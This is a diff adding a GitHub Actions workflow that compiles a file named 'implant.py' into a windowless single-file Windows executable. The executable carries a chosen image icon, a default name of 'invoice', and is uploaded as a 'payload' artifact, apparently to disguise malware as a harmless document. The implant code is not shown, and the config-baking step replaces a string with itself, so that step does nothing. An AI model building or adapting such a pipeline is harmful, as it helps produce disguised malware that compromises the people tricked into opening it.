@@ -1,0 +1,38 @@
+name: build-exe
+
+on:
+  workflow_dispatch:
+    inputs:
+      image:
+        description: "path to image in repo (e.g. img/logo.png)"
+        required: true
+        default: "img/logo.png"
+      name:
+        description: "base name (no ext)"
+        required: true
+        default: "invoice"
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+
+      - name: install
+        run: |
+          python -m pip install --upgrade pip
+          pip install pyinstaller pillow requests
+
+      - name: build
+        run: |
+          python -c "import os, json, time; src=open('implant.py').read(); src=src.replace('CONFIG_JSON = {}', 'CONFIG_JSON = {}'); open('_baked.py','w').write(src)"
+          pyinstaller --onefile --noconsole --name "${{ inputs.name }}" --icon "${{ inputs.image }}" _baked.py
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: payload-${{ inputs.name }}
+          path: dist/*.exe
